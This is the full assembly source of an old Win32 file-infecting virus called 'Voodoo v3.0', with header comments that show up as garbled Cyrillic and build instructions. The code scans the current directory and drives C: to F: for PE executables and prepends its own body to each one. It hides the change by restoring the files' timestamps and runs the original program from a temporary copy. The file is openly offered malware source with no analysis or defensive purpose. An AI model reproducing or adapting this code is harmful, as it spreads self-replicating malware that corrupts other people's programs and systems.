   ;ˆ¬ï ¢¨àãá     : Voodoo v3.0  (¯® ¬®¥© ª« áá¨ä¨ª æ¨¨ :)
   ;€¢â®à         : Voodoo/SMF
   ;Ÿ§ëª ¯à®£à.   : TASM
   ;„ â  á®§¤ ¨ï : 30.07.1999
   ;*¥ ªæ¨ï AV    : none
   ;‡ à ¦ ¥â      : PE-EXE
   ;„¥áâàãªæ¨ï    : none

   ;*â®â ¢¨à ï¢«ï¥âáï ¬®¨¬ ¯¥à¢ë¬ è £®¬ ¢ WIN32API.
   ;Œ®© E-mail voodoo_imishli@mail.ru. *ã¤ã à ¤ ¢ëá«ãè âì ¢ èã
   ;ªà¨â¨ªã, ¢®¯à®áë, § ¬¥ç ¨ï, ¯®¦¥« ¨ï.
   ;P.S.
   ;‚®â ¨ ï  ¯¨á « ¬®¤®£® §¢¥àï ¯® ¢¨32 ! ;)
   ; COMPILATION:
   ; tasm32 /ml /m3 wvoodoo.asm,,;
   ; tlink32 /Tpe /aa /c /v wvoodoo.obj,,, import32.lib,
   ;
   .386p
   .model flat
   include wvoodoo.inc ; ®¯¨á ¨¥ ¨¬¯®àâ 
   .DATA
   mask        db '*.EXE',0
   Dirmask     db '*.*',0
   disk        db 'c:\',0
   str_        db 'Magic People-Voodoo People !'
   DiskCount EQU  4
   VIRUSSIZE EQU 7045 ; à §¬¥à EXE ä ©«  ¢¬¥áâ¥ á® ¢á¥¬¨ ¯®âà®å ¬¨
   .DATA?
   ProcessInfo       dd 4 dup (?)
   ExitCode          dd ?
   HhendleOfFile     dd ?
   HhendleOfFile2    dd ?
   HhendleOfMapFile  dd ?
   Pointer2MapFile   dd ?
   FileSize          dd ?
   tag               db ?
   I_am              db ?
   NumberOfBytesRead dd ?
   parameters        DD ?
   startInfo         dd 17  dup (?)
   CommandLine       dd 200 dup (?)
   Win32FindData     dd 11   dup (?)
   CreationTime   equ offset Win32FindData+4
   LastAccessTime equ offset CreationTime+4
   LastWriteTime equ  offset LastAccessTime+4
   files             dd 200 dup (?)
   buf               db VIRUSSIZE    dup (?)
   SearcHandle       dd ?
   SearcHandle2      dd ?
   CurDir            dd 200 dup (?)
   CurDir2           dd 200 dup (?)
   .CODE
   Voodoo_Ver_3_0:
           ;-- Paluchim Command line ---
           push offset startInfo
           call GetStartupInfoA
           call    GetCommandLineA
           mov esi,eax
           cmp byte ptr [esi+1],':' ;for win9x
           je NormalCommandLine
           inc eax
   NormalCommandLine:
           push    eax
           push    offset CommandLine
           call    lstrcpyA
            mov  esi,offset CommandLine
   @L1:     inc esi
            cmp byte ptr [esi],'.'
            jne @L1
            mov byte ptr [esi+4],0
            mov parameters,esi
            push NULL
            push  FILE_ATTRIBUTE_ARCHIVE
            push OPEN_EXISTING
            push NULL
            push FILE_SHARE_READ ;or FILE_SHARE_WRITE
            push GENERIC_READ ;or GENERIC_WRITE
            push offset CommandLine
            call CreateFileA
            mov  HhendleOfFile,eax
             push eax
             push NULL
             push offset NumberOfBytesRead
             push VIRUSSIZE
             push offset buf
             push eax
             call ReadFile
             pop eax
             push NULL
             push eax
             call GetFileSize
             mov FileSize,eax
             cmp eax,VIRUSSIZE
             je ITS_ME
             ; Create New Map File
            mov esi,parameters
            MOV DWORD ptr [esi],04d4f432eh
            cmp DWORD ptr [esi+5],024242424h
            je DellTempFile
            push NULL
            push FILE_ATTRIBUTE_ARCHIVE        ;
            push OPEN_ALWAYS
            push NULL
            push FILE_SHARE_READ or FILE_SHARE_WRITE
            push GENERIC_READ or GENERIC_WRITE ;
            push offset CommandLine            ;
            call CreateFileA
            mov  HhendleOfFile2,eax ;save HhendleOfFile to use
            push NULL
            push dword ptr FileSize ; size of file mapping
            push NULL
            push PAGE_READWRITE
            push NULL
            push dword ptr [HhendleOfFile2]
            call CreateFileMappingA
            mov HhendleOfMapFile,eax

            push dword ptr FileSize
            push 0
            push 0
            push FILE_MAP_WRITE
            push eax   ;HhendleOfMapFile
            call MapViewOfFile
            mov  Pointer2MapFile,eax
            ; read real programm
              push NULL
              push offset NumberOfBytesRead
              push dword ptr FileSize
              push eax    ;Pointer2MapFile
              push dword ptr HhendleOfFile
              call ReadFile
            push NULL
            push dword ptr Pointer2MapFile
            call FlushViewOfFile
            Push Pointer2MapFile
            call UnmapViewOfFile
            push dword ptr  HhendleOfMapFile
            call CloseHandle
            push  dword ptr HhendleOfFile2
            call CloseHandle
            ; Exec real programm
            push offset ProcessInfo
            push offset startInfo
            push NULL
            push NULL
            push NORMAL_PRIORITY_CLASS
            push NULL
            push NULL
            push NULL
            MOV ESI,parameters
            mov byte ptr [ESI+4],20h
            push offset CommandLine
            push  NULL
            call CreateProcessA
            jmp L1
   ITS_ME:  mov byte ptr I_am,1
   L1:      push dword ptr [HhendleOfFile]
            call CloseHandle
            call Infect
   ExitFromProc:  cmp byte ptr I_am,1
                  je ExitPr
   WaitForProcessExit:
                  push offset ExitCode
                  push dword ptr [ProcessInfo]   ;ProcessHendle
                  call GetExitCodeProcess
                  cmp dword ptr [ExitCode],0
                  je DellBakcapFile
                 jmp WaitForProcessExit
   DellBakcapFile:
           ; Exec programm2DelCom
            push offset ProcessInfo
            push offset startInfo
            push NULL
            push NULL
            push NORMAL_PRIORITY_CLASS
            push NULL
            push NULL
            push NULL
            MOV ESI,parameters
            mov byte  ptr [ESI+4],20h
            mov dword ptr [ESI],04558452eh
            mov dword ptr [ESI+5],024242424h
            push offset CommandLine
            push  NULL ;offset CommandLine
            call CreateProcessA
   ExitPr:  push 0
            call ExitProcess
   DellTempFile:push offset CommandLine
                call DeleteFileA
               jmp ExitPr
   Infect:
           push  offset CurDir
           push  800
           call GetCurrentDirectoryA
           call InfectDir
           mov ecx,DiskCount
   Scan:   push ecx
           push offset disk
           call SetCurrentDirectoryA
           call InfectDir
           inc byte ptr disk
           pop ecx
           loop Scan
           push offset CurDir
           call SetCurrentDirectoryA
           jmp l2
   Exit_ : ret
   InfectDir:
           push  offset CurDir2
           push  800
           call GetCurrentDirectoryA

           push    offset Win32FindData
           push    offset Dirmask
           call    FindFirstFileA
           mov  dword ptr [SearcHandle],eax
    l2:    push    offset Win32FindData
           push    dword ptr [SearcHandle]
           call    FindNextFileA
           or eax,eax
           jz ExitFromProcInfectDir
           cmp byte ptr [files],'.'
           je  l2
           mov eax,[Win32FindData]
           and eax,FILE_ATTRIBUTE_DIRECTORY
           jz l2
           ;set new dir
           push offset CurDir2
           call SetCurrentDirectoryA
           push offset files
           call SetCurrentDirectoryA
           push    offset Win32FindData
           push    offset mask
           call    FindFirstFileA
           mov     dword ptr [SearcHandle2],eax
           cmp     eax,-1
           je     l2
   Next:    or eax,eax
            jz  l2
           call Infect_File
           push    offset Win32FindData
           push    dword ptr [SearcHandle2]
           call    FindNextFileA
           jmp    Next
   ExitFromProcInfectDir:
           ret
   Infect_File:
            push 00000020h
            push offset files
            call SetFileAttributesA
            push NULL
            push FILE_ATTRIBUTE_ARCHIVE
            push OPEN_EXISTING
            push NULL
            push  FILE_SHARE_READ or FILE_SHARE_WRITE
            push GENERIC_READ or GENERIC_WRITE
            push offset files
            call CreateFileA
            CMP eax,-1
            je error
            mov HhendleOfFile,eax ;save HhendleOfFile to use

            push NULL
            push eax
            call GetFileSize
            mov FileSize,eax
   Point@ret:
            push eax ; to MApViewofFile
            push NULL
            push eax
            push NULL
            push PAGE_READWRITE
            push NULL
            push dword ptr [HhendleOfFile]
            call CreateFileMappingA
            mov HhendleOfMapFile,eax
            ; v steke Size
            push 0
            push 0
            push FILE_MAP_WRITE
            push eax
            call MapViewOfFile
            cmp byte ptr tag,1
            je  OkOb
            mov esi,eax
            mov edi,dword ptr [esi+3ch]
            cmp dword ptr [esi+edi],00004550h ;PE Only !
            jne  OOO
            cmp dword ptr [esi+6fh],334e4957h ;'WIN3'  Infected ?
            je  OOO
            call CloseMapping
            mov byte ptr tag,1
            mov eax,dword ptr FileSize
            add eax,VIRUSSIZE
            jmp Point@ret
   OkOb:    mov byte ptr tag,0
            mov Pointer2MapFile,eax
            push edi
            push esi
            push ecx
            pushf
            add eax,dword ptr FileSize
            add eax,VIRUSSIZE -1
            mov edi,eax
            mov esi,dword ptr Pointer2MapFile
            add esi,dword ptr FileSize
            mov ecx,dword ptr FileSize ;size of exe file
            DEC ESI
            std
            rep movsb
            mov edi,dword ptr Pointer2MapFile
            xor eax,eax
            mov ecx,VIRUSSIZE
            cld
            rep
            STOSB
            mov edi,dword ptr Pointer2MapFile
            mov esi,offset buf
            mov ecx,VIRUSSIZE
            cld
            rep movsb
            popf
            pop ecx
            pop esi
            pop edi
    OOO:
           call CloseMapping
           push LastWriteTime
           push LastAccessTime
           push CreationTime
           push dword ptr HhendleOfFile
           call  SetFileTime
           push  dword ptr HhendleOfFile
           call CloseHandle
   error:   push dword ptr Win32FindData
            push offset files
            call SetFileAttributesA
            ret
   CloseMapping:
            push Pointer2MapFile
            call UnmapViewOfFile
            push dword ptr  HhendleOfMapFile
            call CloseHandle
            ret
   enddatt:
   Ends
   End Voodoo_Ver_3_0
